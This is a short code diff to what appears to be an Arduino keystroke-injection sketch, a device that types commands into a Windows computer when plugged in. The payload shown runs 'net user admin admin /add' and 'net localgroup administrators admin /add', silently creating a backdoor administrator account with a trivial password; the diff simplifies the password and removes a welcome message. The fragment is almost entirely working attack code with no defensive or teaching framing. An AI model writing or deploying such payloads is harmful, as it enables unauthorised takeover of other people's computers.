@@ -7,9 +7,7 @@ void setup() {
   delay(500);
   Keyboard.println("color a&&cls");
   delay(myKeyBreak);
-  ascii_println("echo Welcome to lr3800!");
-  delay(myKeyBreak);
-  ascii_println("net user admin admin@lr3800 /add");
+  ascii_println("net user admin admin /add");
   delay(myKeyBreak);
   ascii_println("net localgroup administrators admin /add");
   delay(myKeyBreak);
